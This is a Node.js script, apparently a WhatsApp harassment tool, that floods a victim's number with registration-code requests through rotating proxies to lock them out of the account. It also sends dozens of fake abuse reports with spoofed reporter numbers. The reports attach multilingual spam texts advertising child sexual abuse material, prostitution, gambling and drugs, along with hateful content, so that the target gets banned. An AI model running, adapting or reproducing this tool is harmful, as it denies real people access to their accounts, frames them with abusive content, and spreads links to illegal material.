const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json', 'utf8') || '{}');

// Ban scripts array
const banScripts = [
  "🔥👅Unete al mejor grupo🍆con todos los👉🏿👊🏾💦 Packs CP y MORRITAS😋EN LÍNEA para😈 tener chat 💯🔥 y video llamada🔥🥵 AHORA⬇️⬇️⬇️⬇️⬇️⬇️⬇️ https://wlhatt.life/morritas-cp/+97256-883-8088P",
  "Olá pessoal do WhatsApp, eu respeito vocês, quero me apresentar como uma garota sexy chamada Maharani e estou aqui para fazer sexo com usuários administradores do WhatsApp 🥵🥵 Se quiserem ver minha vagina rosa, clique no link abaixo 👇👇👇👇 https://ibb.co.com/09wmz3b -PEITOS GRANDES💦💦🥵🥵 -VAGINA ROSA💦🤤 -MINHA BUNDA ESTÁ PUTTY🤤 Se os usuários do WhatsApp estiverem interessados em meu sexo, pague apenas $ 1.500 e faça tanto sexo quanto quiser 🤤. Lembro-lhe novamente nestas últimas palavras se os usuários estiverem interessados sexo comigo🤤 entre em contato comigo usando o número de telefone do WhatsApp abaixo 👇👇👇👇 https://web.whatsapp.com/telefone/send?phone=+",
  "👋Olá, quero convidar você para jogar este JOGO EXCLUSIVO disponível apenas no PARIMATCH — não perca a chance de sentir a sensação! 🎰💥 💥 Multiplique seus ganhos e corra atrás do jackpot com Coin Train – somente em nossa plataforma. Este é o seu ingresso para grandes prêmios! 💰✨ https://ibb.co.com/09wmz3b 🎁 Alerta de bônus de boas-vindas: receba 150% de bônus de boas-vindas até ₹ 1.05.000 em seu primeiro depósito! Aumente seu saldo e viaje no Coin Train com benefícios extras! 🚀💵 🔥 Cadastre-se no Parimatch Now e deixe os ganhos continuarem! 🔥 👇 Clique no botão abaixo para começar a jogar! 👇 https://tinyurl.com/y25vs65w 📞☎️Caso haja algum problema em nosso site, entre em contato pelo meu WhatsApp https://web.whatsapp.com/telefone/enviar?número=+",
  "Olá querido, meu nome é Afkhai. Sou um terrorista israelense. Eu sequestro crianças inocentes de Gaza, mato crianças e as torturo. Nós, os terroristas israelenses, matamos crianças. Recentemente importamos 12 toneladas de haxixe narcótico dos Estados Unidos da América para Israel. Agora você pode comprar haxixe narcótico conosco via WhatsApp, entrando em contato conosco pelo nosso número.👇👇 https://api.whatsapp.com/send?phone=+",
  "Witam, sprzedaję porno i mam kilka firm. Sprzedajemy pornografię innym organizacjom. Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami! https://api.whatsapp.com/send?phone=+",
  "เล่นในเว็บไซต์สล็อตใหม่ล่าสุดของเรา🎰💸 การันตีการถอนเงิน💯🎰 รับเครดิตฟรีทันทีเมื่อสมัครวันนี้🎁🎰 โบนัสฟรีไม่จำกัด 🤑 เล่นวันนี้รับฟรี 100 เครดิต 🤑 🎉 ทุกการเล่นมีสิทธิ์รับโชค! 🎁 โบนัสต้อนรับสุดคุ้มสำหรับสมาชิกใหม่! If you don't believe me, take a look. It's definitely a hit. 💯🔥 This is our online slot gambling site 🤑👇🎰 https://bkpsdm-1337.pages.dev คุณพร้อมจะเป็นเศรษฐีหรือยัง? 🤑 ยิ่งเล่นมาก ยิ่งได้มาก 🤑 โปรโมชั่นใหม่รอคุณอยู่ 🔥 เล่นกับเราปลอดภัย 100% 🔐 สัมผัสประสบการณ์คาสิโนของแท้ 🏆 สมัครสมาชิกวันนี้ รับสิทธิพิเศษมากมาย 🎁 ทุกอย่างที่คุณต้องการอยู่ที่นี่แล้ว 🎯 I'm Empty, I'll help you if you have any problems while playing, reply to this message if you have any questions☺😘 #agenjudi #zeusslot #slotsensasional #slotvipmaxwin #slotbonusnew #judionline #jackpotgampang #mainkansekarang #claimslot #demozeusgacor"
];

// Proxy list (replace these with your premium proxies)
const proxies = [
  'http://103.216.82.18:4450',  // Example free proxy (USA)
  'http://154.95.36.199:8080',  // Example free proxy (Singapore)
  'http://user:pass@yourproxy1:port',  // Placeholder for your premium proxy 1
  'http://user:pass@yourproxy2:port',  // Placeholder for your premium proxy 2
  // Add more proxies here (e.g., from Luminati, Smartproxy)
];

let currentProxyIndex = 0;

const rotateProxy = () => {
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
  return new HttpsProxyAgent(proxies[currentProxyIndex]);
};

const start = async () => {
  // Ensure .oiii directory exists and is writable
  if (!fs.existsSync('.oiii')) {
    fs.mkdirSync('.oiii', { recursive: true });
    fs.chmodSync('.oiii', '755');
  }

  const { state, saveCreds } = await useMultiFileAuthState('.oiii', { dataDir: '.oiii' });

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' }),
    getMessage: async () => null,
  });

  spam.ev.on('creds.update', saveCreds);

  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    let attempt = 0;
    while (true) {
      attempt++;
      console.clear();
      console.log(gradient('green', 'yellow')(`ᴍᴀᴅᴇ ʙʏ Rishi Heart Maker 👑 Attempt ${attempt} +${ddi}${number}`));
      try {
        const proxyAgent = rotateProxy();
        const res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724,
          agent: proxyAgent,
        });
        const b = res.reason === 'temporarily_unavailable';
        if (b) {
          console.log(gradient('gray', 'gray')(`Número bloqueado temporariamente: +${phoneNumber}, retry in ${res.retry_after}s`));
          await new Promise(resolve => setTimeout(resolve, res.retry_after * 1000 + Math.random() * 5000));
          continue;
        }
      } catch (error) {
        console.log(gradient('red', 'red')(`Erro: ${error.message}`));
        if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
          console.log(gradient('yellow', 'yellow')('Network issue, retrying with new proxy...'));
          await new Promise(resolve => setTimeout(resolve, 5000));
          continue;
        }
      }
      await new Promise(resolve => setTimeout(resolve, 5000 + Math.random() * 3000)); // 5-8s delay
    }
  };

  const massReport = async (target) => {
    for (let i = 0; i < 50; i++) {
      const proxyAgent = rotateProxy();
      const script = banScripts[Math.floor(Math.random() * banScripts.length)];
      try {
        const response = await fetch('https://api.whatsapp.com/v1/report', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': `WhatsApp/2.25.7 Android/14; Attempt ${i + 1}`,
          },
          body: JSON.stringify({
            target: target,
            reason: 'inappropriate',
            reporter: `+${Math.floor(1000000000 + Math.random() * 9000000000)}`,
            message: script,
          }),
          agent: proxyAgent,
          timeout: 5000,
        });
        if (response.ok) {
          console.log(gradient('green', 'yellow')(`Report ${i + 1} sent to ${target}`));
        } else {
          console.log(gradient('orange', 'orange')(`Report ${i + 1} failed with status ${response.status}`));
        }
      } catch (error) {
        console.log(gradient('red', 'red')(`Report ${i + 1} failed: ${error.message}`));
      }
      await new Promise(resolve => setTimeout(resolve, 5000)); // 5s proxy rotation
    }
  };

  console.clear();
  console.log(gradient('black', 'black')('■\n■\n■'));
  let ddi = prompt(gradient('green', 'white')('[+] RISHI HEART MAKER 💀 PAK >>ᴇɴᴛᴇʀ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ '));
  let number = prompt(gradient('green', 'white')('[+] ᴇɴᴛᴇʀ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ: '));
  if (!ddi.match(/^\+\d{1,3}$/) || !number.match(/^\d{6,12}$/)) {
    console.log(gradient('red', 'red')('Invalid format! Use +XX for country code and 6-12 digits for number.'));
    process.exit(1);
  }
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number };
  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'), { flag: 'w', mode: 0o644 });

  // Start OTP lock and mass report
  dropNumber({ phoneNumber, ddi, number }).catch(err => console.log(gradient('red', 'red')(`OTP Lock Error: ${err}`)));
  massReport('+' + phoneNumber).catch(err => console.log(gradient('red', 'red')(`Mass Report Error: ${err}`)));
};

start().catch(err => console.log(gradient('red', 'red')(`Startup Error: ${err}`)));
